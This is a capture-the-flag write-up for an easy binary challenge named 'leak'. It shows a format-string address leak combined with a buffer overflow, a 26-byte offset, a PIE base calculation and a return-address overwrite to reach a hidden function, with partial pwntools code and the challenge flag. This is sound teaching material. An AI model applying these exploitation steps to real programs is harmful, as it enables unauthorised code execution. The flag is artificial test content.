# leak (easy)

It's easy when you have a leak. Bet you can't win this one!

Author: krloer

nc 20.100.164.71 1024

📎 [leak_handout.tar.gz](leak_handout.tar.gz)

# Writeup

Opened it in Ghidra and found the two main function I think is important. 

- [main](decompiled/main.c) - This is where I can exploit
- [dont_look](decompiled/dont_look.c) - This is the function I need to reach

Seeing in `main` that it uses `scanf` and `gets` which both are vulnerable for buffer overflows.

When I run the program it asks for a number:

```bash
└─$ ./handout/leak                             
Hope you're having a great day!
Please input you favorite number
```

if I enter 1 it lists 5 numbers and asks which were mine.

```bash
The numbers are:
1: 0xcafebabe 
2: 0xdeadbeef 
3: 0xc0ffee 
4: 0x1 
5: 0x555555557d78

Which of these numbers was your favorite? (1-5)
```

Then I can select number 4 and get `Thats right!`. 

The list comes from `main` and this line:

```c
printf("1: 0x%x \n2: 0x%x \n3: 0x%x \n4: 0x%x \n5: %20$p\n\n", local_c, local_10, local_14, local_18);
```

The 5th one leaks a memory address (`%p`). Not quite sure on which, but it gives me the 20th address in one of the directions.

Using this I can find out what the base memory address for this program is. 

First I need to find out how much data I need to send to buffer overflow. I do this by sending a lot of "A"s as the value until I get a segment fault.  The magic number was 26. After that I start overwriting the return address.

```bash
Hope you're having a great day!
Please input you favorite number
1
The numbers are:
1: 0xcafebabe 
2: 0xdeadbeef 
3: 0xc0ffee 
4: 0x1 
5: 0x5634f0a34d78

Which of these numbers was your favorite? (1-5)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
What? You really should remember your FAVORITE number!!
Segmentation fault
```

I quickly add a few more A to confirm more and in `dmesg -w | grep segfault` that I start overwriting the return address: (`41` is the letter `A` in hex)

```bash
[425169.175433] leak[27893]: segfault at 4141414141 ip 0000004141414141 sp 00007ffce632c580 error 14 in leak[5634f0a31000+1000]
```

I also see that I get the base memory address for the program: `5634f0a31000`.

So using this base address + the leaked address (number 5 in the list) I can calculate the offset to the start of my program. 

```python
baseAddress = 0x5634f0a31000 
leakedAddress = 0x5634f0a34d78
memoryAddressOffset = leakedAddress - baseAddress
```

So All I had to do now is to get the 5th number in the list, substract the `memoryAddressOffset` and I would have the base address for the program. Now since I can overwrite the return address I can just insert the address for the function `dont_look`. I could find the offset for that function in ghidra but pwntools has functions for this aswell.

```python
elf = ELF("./handout/leak")
addressForDontLook = <the leaked address > - <memoryAddressOffset> + elf.symbols['dont_look'],
```

So if we send this address after the 26 characters it will be where the program goes after executing it's next "return". 

And bingo:

```bash
└─$ python3 solve.py remote
REMOTE
What? You really should remember your FAVORITE number!!
nothing to see here...
wack{w0w_y0u_l3aked_m3}
```

# Flag

```
wack{w0w_y0u_l3aked_m3}
```